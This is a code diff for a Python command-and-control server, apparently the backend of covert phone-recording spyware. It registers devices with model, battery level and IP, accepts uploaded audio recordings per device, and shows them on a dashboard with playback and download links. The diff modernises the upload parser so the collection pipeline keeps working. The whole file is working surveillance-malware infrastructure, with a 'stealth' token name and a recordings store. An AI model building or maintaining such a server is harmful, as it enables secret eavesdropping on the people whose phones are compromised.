@@ -4,11 +4,13 @@ import json
 import uuid
 import datetime
 from http.server import HTTPServer, BaseHTTPRequestHandler
-import cgi
+from email.parser import BytesParser
+from email.policy import default
 
 PORT = int(os.environ.get("PORT", "10000"))
 C2_AUTH_TOKEN = os.environ.get("C2_AUTH_TOKEN", "stealth-auditor-token-2026")
 SAVE_DIR = os.environ.get("SAVE_DIR", "./c2_recordings")
+
 DEVICES = {}
 RECORDINGS = []
 
@@ -36,14 +38,23 @@ def save_recording(device_id, filename, data, remote_ip):
     DEVICES[device_id].update({"last_seen": now(), "recordings_count": DEVICES[device_id].get("recordings_count", 0) + 1})
     return rec_id
 
+def parse_multipart(data, boundary):
+    msg = BytesParser(policy=default).parsebytes(b'Content-Type: multipart/form-data; boundary=' + boundary + b'\r\n\r\n' + data)
+    for part in msg.iter_parts():
+        if part.get_filename():
+            return part.get_filename(), part.get_payload(decode=True)
+    return None, None
+
 class C2Handler(BaseHTTPRequestHandler):
     def send_json(self, status, data):
         self.send_response(status)
         self.send_header("Content-Type", "application/json")
         self.end_headers()
         self.wfile.write(json.dumps(data).encode())
+
     def auth_ok(self):
         return self.headers.get("X-Auth-Token") == C2_AUTH_TOKEN
+
     def do_GET(self):
         if self.path in ["/", "/dashboard"]:
             self.dash()
@@ -65,6 +76,7 @@ class C2Handler(BaseHTTPRequestHandler):
             self.send_error(404)
         else:
             self.send_error(404)
+
     def do_POST(self):
         if not self.auth_ok():
             self.send_error(403)
@@ -75,6 +87,7 @@ class C2Handler(BaseHTTPRequestHandler):
             self.upload()
         else:
             self.send_error(404)
+
     def checkin(self):
         length = int(self.headers.get("Content-Length", 0))
         body = self.rfile.read(length).decode("utf-8", errors="ignore")
@@ -84,15 +97,23 @@ class C2Handler(BaseHTTPRequestHandler):
             DEVICES[did] = {"first_seen": now()}
         DEVICES[did].update({"last_seen": now(), "model": d.get("model"), "battery": d.get("battery"), "ip": self.client_address[0]})
         self.send_json(200, {"status": "ok"})
+
     def upload(self):
-        form = cgi.FieldStorage(fp=self.rfile, headers=self.headers, environ={"REQUEST_METHOD": "POST", "CONTENT_TYPE": self.headers.get("Content-Type")})
-        item = form["file"] if "file" in form else None
-        if not item or not hasattr(item, "file"):
+        length = int(self.headers.get("Content-Length", 0))
+        data = self.rfile.read(length)
+        ct = self.headers.get("Content-Type", "")
+        if "boundary=" not in ct:
+            self.send_error(400)
+            return
+        boundary = ct.split("boundary=")[1].encode()
+        filename, filedata = parse_multipart(data, boundary)
+        if not filedata:
             self.send_error(400)
             return
         did = self.headers.get("X-Device-ID", "unknown")
-        rid = save_recording(did, item.filename or "recording.aac", item.file.read(), self.client_address[0])
+        rid = save_recording(did, filename or "recording.aac", filedata, self.client_address[0])
         self.send_json(200, {"status": "ok", "id": rid})
+
     def dash(self):
         rows = "".join(f"<tr><td>{r['timestamp']}</td><td>{r['device_id']}</td><td>{r['type']}</td><td>{r['filename']}</td><td>{r['size']:,}</td><td><audio controls src='/download/{r['id']}'></audio> <a href='/download/{r['id']}'>DL</a></td></tr>" for r in RECORDINGS[:100])
         devs = "".join(f"<tr><td>{k}</td><td>{v.get('model','?')}</td><td>{v.get('last_seen','?')}</td><td>{v.get('battery','?')}%</td><td>{v.get('recordings_count',0)}</td></tr>" for k, v in DEVICES.items())
